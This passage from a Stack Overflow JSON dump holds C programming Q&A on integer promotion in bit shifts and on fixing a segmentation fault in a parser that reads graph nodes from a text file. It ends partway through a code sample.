"creation_date": 1518556843, "post_id": 48775794, "comment_id": 84553340, "body": "But there can be cases <a href=\"https://stackoverflow.com/q/22702091/1708801\">due to promotions that could have unexpected results</a>"}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "reply_to_user": {"reputation": 280, "user_id": 2956948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9902d14caad47599731eac745a847cfc?s=128&d=identicon&r=PG&f=1", "display_name": "polynomial_donut", "link": "https://stackoverflow.com/users/2956948/polynomial-donut"}, "edited": false, "score": 2, "creation_date": 1518556997, "post_id": 48775794, "comment_id": 84553414, "body": "@polynomial_donut That is <i>not</i> correct because 1) <code>size_t</code> may be larger than <code>unsigned int</code>, and 2) the standard specifically states that the type of a promoted value is <code>int</code>."}, {"owner": {"reputation": 436126, "user_id": 922184, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/h7WDB.jpg?s=128&g=1", "display_name": "Mysticial", "link": "https://stackoverflow.com/users/922184/mysticial"}, "edited": false, "score": 0, "creation_date": 1518557296, "post_id": 48775794, "comment_id": 84553561, "body": "The rule of thumb if you&#39;re not interested in language lawyer level of detail is that integer promotion sucks in C and C++. And if you think that&#39;s bad, wait till you get to function overloading ambiguities with integer types (numeric types in general)."}, {"owner": {"reputation": 280, "user_id": 2956948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9902d14caad47599731eac745a847cfc?s=128&d=identicon&r=PG&f=1", "display_name": "polynomial_donut", "link": "https://stackoverflow.com/users/2956948/polynomial-donut"}, "reply_to_user": {"reputation": 436126, "user_id": 922184, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/h7WDB.jpg?s=128&g=1", "display_name": "Mysticial", "link": "https://stackoverflow.com/users/922184/mysticial"}, "edited": false, "score": 0, "creation_date": 1518560191, "post_id": 48775794, "comment_id": 84554887, "body": "@Mysticial Luckily, we are working with <code>C</code>, so no <code>C++</code> voodoo :) (*except for basic unit testing code -_-)"}, {"owner": {"reputation": 280, "user_id": 2956948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9902d14caad47599731eac745a847cfc?s=128&d=identicon&r=PG&f=1", "display_name": "polynomial_donut", "link": "https://stackoverflow.com/users/2956948/polynomial-donut"}, "reply_to_user": {"reputation": 436126, "user_id": 922184, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/h7WDB.jpg?s=128&g=1", "display_name": "Mysticial", "link": "https://stackoverflow.com/users/922184/mysticial"}, "edited": false, "score": 0, "creation_date": 1518560293, "post_id": 48775794, "comment_id": 84554925, "body": "@Mysticial btw.: Funny coincidence, we almost have the same names :) cheers"}, {"owner": {"reputation": 5668, "user_id": 4083309, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a6b4ef5a2e912153069b82607789a717?s=128&d=identicon&r=PG&f=1", "display_name": "Arne Vogel", "link": "https://stackoverflow.com/users/4083309/arne-vogel"}, "edited": false, "score": 0, "creation_date": 1518602473, "post_id": 48775794, "comment_id": 84570015, "body": "@dbush The fact that integral promotion only results in <code>int</code> or <code>unsigned int</code>, and the process is instead called &quot;integral conversion&quot; when larger types are involved, always throws me off\u2026"}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 11, "last_activity_date": 1518557404, "last_edit_date": 1518557404, "creation_date": 1518556686, "answer_id": 48775794, "question_id": 48775746, "link": "https://stackoverflow.com/questions/48775746/do-compilers-optimize-out-net-zero-bit-shifts/48775794#48775794", "title": "Do compilers optimize out net zero bit shifts?", "body": "<p>What you are seeing is a result of <strong>integer promotions</strong>.  Any value with a type of lower rank than <code>int</code>, when used in an expression, is promoted to <code>int</code>.</p>\n\n<p>This is detail in section  6.3.1.1 of the <a href=\"http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1570.pdf\" rel=\"noreferrer\">C standard</a></p>\n\n<blockquote>\n  <p><em>2</em> The following may be used in an expression wherever an <code>int</code> or <code>unsigned int</code> may\n  be used:</p>\n  \n  <ul>\n  <li>An object or expression with an integer type (other than <code>int</code> or <code>unsigned int</code>)\n  whose integer conversion rank is less than or equal to the rank of <code>int</code> and\n  <code>unsigned int</code>.</li>\n  <li>A bit-field of type <code>_Bool</code>, <code>int</code>, <code>signed int</code>, or <code>unsigned int</code>.</li>\n  </ul>\n  \n  <p>If an <code>int</code> can represent all values of the original type (as restricted by the width, for a\n  bit-field), the value is converted to an <code>int</code>; otherwise, it is converted to an <code>unsigned int</code>. These are called the <em>integer promotions</em>.  All other types are unchanged by the\n  integer promotions.</p>\n</blockquote>\n\n<p>In this case:</p>\n\n<pre><code>var = var &lt;&lt; SHIFT &gt;&gt; SHIFT;\n</code></pre>\n\n<p><code>var</code> is first promoted to <code>int</code>.  This type is at least 16 bits wide, and most likely 32 bits wide.  So the value being operated on is <code>0x00000018</code>.  A left shift of 4 results in <code>0x00000180</code>, and subsequently right shifting results in <code>0x00000018</code>.</p>\n\n<p>The result is then stored in a <code>uint_8</code>.  Since the value fits in a variable of this type, no conversion is required and <code>0x18</code> is stored.</p>\n"}, {"tags": [], "owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "is_accepted": false, "score": 1, "last_activity_date": 1518566604, "creation_date": 1518566604, "answer_id": 48777652, "question_id": 48775746, "link": "https://stackoverflow.com/questions/48775746/do-compilers-optimize-out-net-zero-bit-shifts/48777652#48777652", "title": "Do compilers optimize out net zero bit shifts?", "body": "<p>The expression:</p>\n\n<pre><code>var = var &lt;&lt; SHIFT &gt;&gt; SHIFT;\n</code></pre>\n\n<p>is not semantically equivelent to </p>\n\n<pre><code>var = var &lt;&lt; SHIFT ;\nvar = var &gt;&gt; SHIFT ; \n</code></pre>\n\n<p>That would require:  </p>\n\n<pre><code>var = (uint8_t)(var &lt;&lt; SHIFT) &gt;&gt; SHIFT ;\n</code></pre>\n\n<p>which illustrates the effective difference between the two - the observed behaviour does not require optimisation, rather it is <em>required</em> by language definition with respect to type promotion rules in expressions.</p>\n\n<p>That said, it is also entirely possible that a compiler could optimise out the shifts.  Optimisation may not change the result where the behaviour is <em>defined</em> as it is in this case.</p>\n"}], "owner": {"reputation": 280, "user_id": 2956948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9902d14caad47599731eac745a847cfc?s=128&d=identicon&r=PG&f=1", "display_name": "polynomial_donut", "link": "https://stackoverflow.com/users/2956948/polynomial-donut"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 552, "favorite_count": 0, "accepted_answer_id": 48775794, "answer_count": 2, "score": 7, "last_activity_date": 1518566604, "creation_date": 1518556385, "last_edit_date": 1518556603, "question_id": 48775746, "link": "https://stackoverflow.com/questions/48775746/do-compilers-optimize-out-net-zero-bit-shifts", "title": "Do compilers optimize out net zero bit shifts?", "body": "<p>I have some code like the following code block (I am not allowed to post the original code) inside a <code>.cpp</code> file that I think is being compiled by <code>clang++</code> (<code>Ubuntu clang version 3.5.2-3ubuntu1 (tags/RELEASE_352/final) (based on LLVM 3.5.2)</code>).<br>\nIt looks like <code>C</code> code, because we are using <code>GoogleTest</code> for testing our <code>C</code> code. Anyways:</p>\n\n<pre><code>size_t const SHIFT = 4;\nuint8_t var, var2;\n/* Omitted: Code that sets var to, say 00011000 (base 2) */\nvar2 = var;\nvar = var &lt;&lt; SHIFT &gt;&gt; SHIFT; // [1] result is 00011000 (base 2) (tested with printf)\nvar2 = var2 &lt;&lt; SHIFT;\nvar2 = var2 &gt;&gt; SHIFT; // [2] result is 00001000 (base 2) (tested with printf)\n</code></pre>\n\n<p>Now, why does comment <code>[1]</code> hold true? I was assuming that the corresponding line would result in the top 4 bits being zeroed out. But I found out that this isn't true; the program simply restores the original value.</p>\n\n<blockquote>\n  <p>Is this some language defined behavior, or is <code>clang</code> compiling out a supposedly useless bit shift?</p>\n</blockquote>\n\n<p>(I checked associativity (using <a href=\"http://en.cppreference.com/w/c/language/operator_precedence\" rel=\"noreferrer\">this table on cppreference.com</a>, assuming that associativity/precedence of basic operators won't differ between versions of <code>C++</code> and probably not between <code>C++</code> and <code>C</code> either, at least not in 'current versions') and it seems like the RHS expression at <code>[1]</code> should really yield the same result as the two following statements)</p>\n"}, {"tags": ["c", "fault"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1518556002, "post_id": 48775429, "comment_id": 84552968, "body": "Please post the <a href=\"http://stackoverflow.com/help/mcve\">Minimal, Complete, and Verifiable example</a> that shows the problem. It would be more readable without the double line spacing, but with sensible whitespace."}, {"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 0, "creation_date": 1518556039, "post_id": 48775429, "comment_id": 84552991, "body": "In <code>insert_node</code> you are copying all characters expect the 0-terminating one. Use <code>strcpy</code>: <code>strcpy(tmp-&gt;id, data-&gt;id);</code>"}, {"owner": {"reputation": 10281, "user_id": 51760, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/SI89u.jpg?s=128&g=1", "display_name": "Aif", "link": "https://stackoverflow.com/users/51760/aif"}, "edited": false, "score": 0, "creation_date": 1518556046, "post_id": 48775429, "comment_id": 84552995, "body": "have you heard about <code>strcpy</code>/<code>strncpy</code>? :)"}, {"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 1, "creation_date": 1518556108, "post_id": 48775429, "comment_id": 84553027, "body": "also <a href=\"https://stackoverflow.com/questions/5431941/why-is-while-feof-file-always-wrong\">why while(!foef(...)) is alway wrong</a>"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1518556229, "post_id": 48775429, "comment_id": 84553080, "body": "Always test the return value from <code>fopen</code>. Also <code>char c;</code> ==&gt; <code>int c;</code> always read the man pages."}, {"owner": {"reputation": 19, "user_id": 8955046, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/06a038d28aa9c35ac8c0c02990f8de28?s=128&d=identicon&r=PG", "display_name": "user8955046", "link": "https://stackoverflow.com/users/8955046/user8955046"}, "edited": false, "score": 0, "creation_date": 1518557434, "post_id": 48775429, "comment_id": 84553636, "body": "that is what I get guys running with valgrind: Conditional jump or move depends on uninitialised value(s) ==3612==    at 0x4C30B18: strcpy (vg_replace_strmem.c:510) ==3612==    by 0x4008B2: insert_node (mulval.c:44) ==3612==    by 0x400C03: generate_nodes (mulval.c:159) ==3612==    by 0x400CE8: main (mulval.c:187)"}, {"owner": {"reputation": 19, "user_id": 8955046, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/06a038d28aa9c35ac8c0c02990f8de28?s=128&d=identicon&r=PG", "display_name": "user8955046", "link": "https://stackoverflow.com/users/8955046/user8955046"}, "edited": false, "score": 0, "creation_date": 1518558101, "post_id": 48775429, "comment_id": 84553956, "body": "I ran valgrind with option &quot;--track-origins=yes&quot; and it says &quot;Uninitialised value was created by a heap allocation&quot; in the line I use malloc when I declare data"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1518558579, "post_id": 48775429, "comment_id": 84554244, "body": "So, look out for uninitialised values. Note that local variables must be explicity initialised."}], "answers": [{"comments": [{"owner": {"reputation": 19, "user_id": 8955046, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/06a038d28aa9c35ac8c0c02990f8de28?s=128&d=identicon&r=PG", "display_name": "user8955046", "link": "https://stackoverflow.com/users/8955046/user8955046"}, "edited": false, "score": 0, "creation_date": 1518561025, "post_id": 48776202, "comment_id": 84555195, "body": "thank you for the answer. The aux_pointer is to check first if the line is smaller than 12 characters because I don&#39;t want to add them to graph variable. And graph-&gt;node_name never gets newline charactere."}, {"owner": {"reputation": 19, "user_id": 8955046, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/06a038d28aa9c35ac8c0c02990f8de28?s=128&d=identicon&r=PG", "display_name": "user8955046", "link": "https://stackoverflow.com/users/8955046/user8955046"}, "edited": false, "score": 0, "creation_date": 1518561161, "post_id": 48776202, "comment_id": 84555265, "body": "the last part I didn&#39;t understand. You mean change &quot;graph_node* data = (graph_node*)malloc(sizeof(graph_node));&quot; to &quot;graph_node data;&quot; so it is not a pointer anymore and than I dont need to use malloc?"}, {"owner": {"reputation": 19, "user_id": 8955046, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/06a038d28aa9c35ac8c0c02990f8de28?s=128&d=identicon&r=PG", "display_name": "user8955046", "link": "https://stackoverflow.com/users/8955046/user8955046"}, "edited": false, "score": 0, "creation_date": 1518561212, "post_id": 48776202, "comment_id": 84555293, "body": "I made the changes but I still get segmentation fault. The only change I didn&#39;t make was the last one because I didnt understand"}, {"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 0, "creation_date": 1518563161, "post_id": 48776202, "comment_id": 84555927, "body": "<i>so it is not a pointer anymore and than I dont need to use malloc?</i> yes, that&#39;s correct. By not being a pointer, it&#39;s an object on the stack. ---- <i>but I still get segmentation fault</i> I still have trouble understanding your parsing of the data. Can you edit your question and show a few lines of the input file and explain what the lines means, which are the ones you want, which are not. At some point you look for a comma, I&#39;m not sure if that&#39;s correct, I don&#39;t know your algorithm."}, {"owner": {"reputation": 19, "user_id": 8955046, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/06a038d28aa9c35ac8c0c02990f8de28?s=128&d=identicon&r=PG", "display_name": "user8955046", "link": "https://stackoverflow.com/users/8955046/user8955046"}, "edited": false, "score": 0, "creation_date": 1518565444, "post_id": 48776202, "comment_id": 84556610, "body": "yes that is right I look for a comma, because I want the id before the first comma and than the name of the node after the first comma. But I don&#39;t want lines in which there are only numbers followed by commas"}, {"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "reply_to_user": {"reputation": 19, "user_id": 8955046, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/06a038d28aa9c35ac8c0c02990f8de28?s=128&d=identicon&r=PG", "display_name": "user8955046", "link": "https://stackoverflow.com/users/8955046/user8955046"}, "edited": false, "score": 0, "creation_date": 1518565662, "post_id": 48776202, "comment_id": 84556670, "body": "@user8955046 like I said edit you question and add a few lines of the input file and which lines you want to read and which you don&#39;t."}, {"owner": {"reputation": 19, "user_id": 8955046, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/06a038d28aa9c35ac8c0c02990f8de28?s=128&d=identicon&r=PG", "display_name": "user8955046", "link": "https://stackoverflow.com/users/8955046/user8955046"}, "edited": false, "score": 0, "creation_date": 1518565842, "post_id": 48776202, "comment_id": 84556721, "body": "I made the edit. In the txt file as you can see above there is I just want lines like the first &quot;1,&quot;execCode(workStation,root)&quot;,&quot;OR&quot;,0&quot; but in this line I just want &quot;1,&quot;execCode(workStation,root)&quot;,&quot; they are the id and the name of the node."}, {"owner": {"reputation": 19, "user_id": 8955046, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/06a038d28aa9c35ac8c0c02990f8de28?s=128&d=identicon&r=PG", "display_name": "user8955046", "link": "https://stackoverflow.com/users/8955046/user8955046"}, "edited": false, "score": 0, "creation_date": 1518565916, "post_id": 48776202, "comment_id": 84556741, "body": "The last line which is &quot;6,7,-1&quot; I don&#39;t want to get them and they are allways smaller than 12 characters"}, {"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 0, "creation_date": 1518566034, "post_id": 48776202, "comment_id": 84556773, "body": "and <code>&quot;1&quot;</code> is the ID and <code>&quot;execCode&quot;</code> node_name? Are IDs always numeric?"}, {"owner": {"reputation": 19, "user_id": 8955046, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/06a038d28aa9c35ac8c0c02990f8de28?s=128&d=identicon&r=PG", "display_name": "user8955046", "link": "https://stackoverflow.com/users/8955046/user8955046"}, "edited": false, "score": 0, "creation_date": 1518566358, "post_id": 48776202, "comment_id": 84556868, "body": "yes that is correct! and IDs are allways numeric. But the node name would be: execCode(workStation,root)"}, {"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "reply_to_user": {"reputation": 19, "user_id": 8955046, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/06a038d28aa9c35ac8c0c02990f8de28?s=128&d=identicon&r=PG", "display_name": "user8955046", "link": "https://stackoverflow.com/users/8955046/user8955046"}, "edited": false, "score": 0, "creation_date": 1518572880, "post_id": 48776202, "comment_id": 84558568, "body": "@user8955046 I&#39;ve made an update of my answer addressing your last comments."}, {"owner": {"reputation": 19, "user_id": 8955046, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/06a038d28aa9c35ac8c0c02990f8de28?s=128&d=identicon&r=PG", "display_name": "user8955046", "link": "https://stackoverflow.com/users/8955046/user8955046"}, "edited": false, "score": 0, "creation_date": 1518620621, "post_id": 48776202, "comment_id": 84582398, "body": "thank you for the changes! it is almost working the only problem is that it&#39;s returning only the first three letters of node name. I mean for example: execCode(workStation,root) just returns exe"}, {"owner": {"reputation": 19, "user_id": 8955046, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/06a038d28aa9c35ac8c0c02990f8de28?s=128&d=identicon&r=PG", "display_name": "user8955046", "link": "https://stackoverflow.com/users/8955046/user8955046"}, "edited": false, "score": 0, "creation_date": 1518809992, "post_id": 48776202, "comment_id": 84671871, "body": "@Pablo I am having problems in generating the edges in my graph now according to this question: <a href=\"https://stackoverflow.com/questions/48832974/why-my-c-code-to-generate-a-graph-from-a-txt-file-is-not-working\" title=\"why my c code to generate a graph from a txt file is not working\">stackoverflow.com/questions/48832974/&hellip;</a>"}, {"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "reply_to_user": {"reputation": 19, "user_id": 8955046, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/06a038d28aa9c35ac8c0c02990f8de28?s=128&d=identicon&r=PG", "display_name": "user8955046", "link": "https://stackoverflow.com/users/8955046/user8955046"}, "edited": false, "score": 0, "creation_date": 1518811704, "post_id": 48776202, "comment_id": 84672654, "body": "@user8955046 I&#39;ll take a look at this later."}, {"owner": {"reputation": 19, "user_id": 8955046, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/06a038d28aa9c35ac8c0c02990f8de28?s=128&d=identicon&r=PG", "display_name": "user8955046", "link": "https://stackoverflow.com/users/8955046/user8955046"}, "edited": false, "score": 0, "creation_date": 1518822797, "post_id": 48776202, "comment_id": 84677128, "body": "@Pablo now is only missing the edges from the graph in this question the nodes were dealt"}], "tags": [], "owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "is_accepted": false, "score": 3, "last_activity_date": 1518572784, "last_edit_date": 1518572784, "creation_date": 1518558547, "answer_id": 48776202, "question_id": 48775429, "link": "https://stackoverflow.com/questions/48775429/why-am-i-getting-segmentation-fault-on-the-code-below/48776202#48776202", "title": "why am I getting segmentation fault on the code below?", "body": "<p>The biggest problem in your code is that you are constantly ignoring the\n<code>'\\0'</code>-terminating byte and pass to functions like <code>strlen</code> which expects a\nvalid string (one that is 0-terminated).</p>\n\n<p>For example in <code>insert_node</code>:</p>\n\n<pre><code>for(int i = 0; i &lt; strlen(data-&gt;id); i++)\n        temp-&gt;id[i] = data-&gt;id[i];\n</code></pre>\n\n<p>Here you are copying all characters expect the <code>'\\0'</code>-terminating byte,\n<code>temp-&gt;id</code> will store a sequence of characters but it is <strong>not</strong> a string.\n<code>strlen(data-&gt;id)</code> will have an undefined behaviour because <code>data-&gt;id</code> is most\nlikely not 0-terminated if you initialized it without 0-terminating the string.</p>\n\n<p>Here you should use <code>strcpy</code> if you know that the source strings is smaller than\n49 characters long, or <code>strncpy</code> to be completely sure:</p>\n\n<pre><code>strncpy(temp-&gt;id, data-&gt;id, sizeof temp-&gt;id);\ntemp-&gt;id[sizeof(temp-&gt;id) - 1] = 0;\n</code></pre>\n\n<p>Same thing with <code>node_name</code>. Also you are not checking if <code>malloc</code> returned\n<code>NULL</code>.</p>\n\n<p>Also the <code>foef</code> lines are wrong, see <a href=\"https://stackoverflow.com/questions/5431941/why-is-while-feof-file-always-wrong\">Why <code>while(!foef(...))</code> is always wrong</a>.</p>\n\n<p>You should rewrite this</p>\n\n<pre><code>while(c != '\\n' &amp;&amp; !feof(f_Aux_Pointer)){ // check line\n    c = fgetc(f_Aux_Pointer); \n    line[counter] = c;\n    counter++;\n}\n</code></pre>\n\n<p>like this:</p>\n\n<pre><code>int c; // &lt;-- not char c\n\nwhile((c = fgetc(f_Aux_Pointer)) != '\\n' &amp;&amp; c != EOF)\n    line[counter++] = c;\n\nline[counter] = 0;  // terminating the string!\n</code></pre>\n\n<p><code>fgetc</code> returns an <code>int</code>, not a <code>char</code>, it should be <code>int</code>, otherwise the\ncomparison with <code>EOF</code> will go wrong. And here you ignored to set the\n0-terminating byte, the result was a sequence of characters, but not a string.\nThe next line <code>if(strlen(line) ...</code> overflow because of this, as <code>strlen</code> will\nkeep looking for the 0-terminating byte beyond the limits. For me is not clear\nwhy you even check for <code>EOF</code>, as you would keep reading when the outer <code>while</code>\nloop resumes. If <code>f_Aux_Pointer</code> got to the end, shouldn't the function just\nreturn? I'm not really sure what you are doing there. Also there is no strategy\nfor when the newline is not in the first 49 read characters. I think you should\nrethink your strategy here.</p>\n\n<p>It also would have been easier to do:</p>\n\n<pre><code>if(fgets(line, sizeof line, f_Aux_Pointer) == NULL)\n{\n    // error handling\n    return; // perhaps this?\n}\n\nline[strcspn(line, \"\\n\")] = 0; // removing the newline\n\nif(strlen(line) &gt; 12)\n...\n</code></pre>\n\n<p>Here</p>\n\n<pre><code>while(c != ','){ //id\n\n    c = fgetc(f_Data_Pointer);\n\n    if(c != ','){\n\n        data-&gt;id[counter] = c;          \n        counter++;\n    }\n\n    printf(\"%c\", c);\n\n}\n</code></pre>\n\n<p>you have same error as above, you never set the \\0-terminating byte. At the end\nof the <code>while</code> you should have <code>data-&gt;id[counter] = 0;</code>. The same thing in the\nnext <code>while</code> loop.</p>\n\n<p>In <code>generate_nodes</code> you don't need to allocate memory for the temporal\n<code>graph_node</code> object as <code>insert_node</code> will create a copy anyway. You can do:</p>\n\n<pre><code>graph_node data;\n\n...\ndata.id[counter] = c;\n...\ndata.node_name[counter] = c;\n...\n\ninsert_node(graph, &amp;data);\ndata.id[0] = 0;\ndata.node_name[0] = 0;\n</code></pre>\n\n<p>and you will have one <code>malloc</code> less to worry about.</p>\n\n<hr>\n\n<p><strong>EDIT</strong></p>\n\n<p>Because your IDs are always numerical, I'd change the struct to this:</p>\n\n<pre><code>struct Graph_Node{\n    int id;\n    char node_name[50];\n\n    struct Graph_Node* next;\n    struct Graph_Node* edges;\n};  \n</code></pre>\n\n<p>which would make life easier. If your conditions are true\nthat only the lines you need are longer than 12 characters and that the lines\nyou are interested are always of the same format (no spaces between the commas,\nsecond column is always quotes) as the ones posted in your\nanswer, then you can parse it like this:</p>\n\n<pre><code>int generate_nodes(graph_node **graph, const char *file_name)\n{\n    if(file_name == NULL || graph == NULL)\n        return 0; // return error\n\n    // no need to allocate memory for it\n    // if the insert_node is going to make a\n    // copy anyway\n    struct Graph_Node data = { .next = NULL, .edges = NULL };\n\n    FILE *fp = fopen(file_name, \"r\");\n    if(fp == NULL)\n    {\n        fprintf(stderr, \"Error opening file %s: %s\\n\", file_name,\n                strerror(errno));\n        return 0;\n    }\n\n    // no line will be longer than 1024\n    // based on your conditions\n    char line[1024];\n\n    size_t linenmr = 0;\n\n    while(fgets(line, sizeof line, fp))\n    {\n        linenmr++;\n        // getting rid of the newline\n        line[strcspn(line, \"\\n\")] = 0;\n\n        if(strlen(line) &lt;= 12)\n            continue; // resume reading, skipt the line\n\n        char *sep;\n        long int id = strtol(line, &amp;sep, 0);\n\n        // assuming that there is not white spaces\n        // before and after the commas\n        if(*sep != ',')\n        {\n            fprintf(stderr, \"Warning, line %lu is malformatted, '&lt;id&gt;,' exepcted\\n\", linenmr);\n            continue;\n        }\n\n        data.id = id;\n\n        // format is: \"....\",\n\n        if(sep[1] != '\"')\n        {\n            fprintf(stderr, \"Warning, line %lu is malformatted, \\\"&lt;string&gt;\\\", exepcted\\n\", linenmr);\n            continue;\n        }\n\n        // looking for \",\n        char *endname = strstr(sep + 2, \"\\\",\"); \n\n        if(endname == NULL)\n        {\n            fprintf(stderr, \"Warning, line %lu is malformatted, \\\"&lt;string&gt;\\\", exepcted\\n\", linenmr);\n            continue;\n        }\n\n        // ending string at \",\n        // easier to do strcnpy\n        *endname = 0;\n\n        strncpy(data.node_name, sep + 2, sizeof data.node_name);\n        data.node_name[sizeof(data.node_name) - 1] = 0;\n\n        insert_node(graph, &amp;data);\n    }\n\n    fclose(fp);\n    return 1;\n}\n</code></pre>\n\n<p>Now the interesting bits are these:</p>\n\n<pre><code>    char *sep;\n    long int id = strtol(line, &amp;sep, 0);\n\n    // assuming that there is not white spaces\n    // before and after the commas\n    if(*sep != ',')\n    {\n        fprintf(stderr, \"Warning, line %lu is malformatted, '&lt;id&gt;,' exepcted\\n\", linenmr);\n        continue;\n    }\n</code></pre>\n\n<p><a href=\"https://linux.die.net/man/3/strtol\" rel=\"nofollow noreferrer\"><code>strtol</code></a> is a function that converts a number in a string to an actual\ninteger. This function is better than <code>atoi</code>, because it allows you to convert\nnumbers in different bases, from binary to hexadecimal. The second advantage is\nthat it tells you where it stopped reading. This is great for error detection,\nand I use this behviour to detect if the line has the correct format. If the\nline has the correct format, a comma <code>,</code> must appear next to the number, I check\nfor this and if it's not true, I print an error message and skip the line and\ncontinue reading the file.</p>\n\n<p>The next <code>if</code> checks if the next character is a quote <code>\"</code>, because based on your\nfile, the second argument is enclosed in quotes. Sadly the separtor of the\narguments is a comma which is also used as a normal character in the string.\nThis makes things a little bit more complex (you cannot use <code>strtok</code> here).\nOnce again, I assume that the whole\nargument ends in <code>\",</code>. Note that this does not take into consideration escaped\nquotes. A line like this:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>3,\"somefunc(a,b,\\\"hello\\\",d)\",\"OR\",0\n</code></pre>\n\n<p>would be parsed incorrectly. When <code>\",</code> is found, I set the quote to <code>'\\0'</code> so\nthat it is more easier to use <code>strncpy</code>, otherwise I would have to calculate the\nlength of the string, check that it's length doesn't surpass the destination size, etc.\nIf you need to keep parsing, <code>endname + 1</code> should point to the next comma,\notherwise the format is wrong.</p>\n\n<pre><code>    strncpy(data.node_name, sep + 2, sizeof data.node_name);\n    data.node_name[sizeof(data.node_name) - 1] = 0;\n</code></pre>\n\n<p>Here I copy the string. The source is <code>sep + 2</code>, because <code>sep</code> points to the\nfirst comma, so you have to skip it. The next character is the quote, so you\nhave to skip it as well, hence <code>sep + 2</code>. Because the legth of the name is\nunknown, it's better to use <code>strncpy</code>, this will ensure that you don't write more\nbytes than you need.</p>\n\n<p>The last step is to insert the node into the graph. Note that I didn't allocate\nmemory, because I know that <code>insert_node</code> is a going to make a new copy anyway.\nBecause the <code>data</code> is only used temporarily, you don't need to allocate memory,\njust pass a pointer to <code>data</code> (by passing <code>&amp;data</code>) to <code>insert_node</code>.</p>\n\n<p>I've tested this function with a dummy <code>graph</code> and a dummy <code>insert_node</code> that\nonly prints the node:</p>\n\n<pre><code>void insert_node(graph_node** node, graph_node* data)\n{\n    printf(\"ID: %d, node_name: %s\\n\", data-&gt;id, 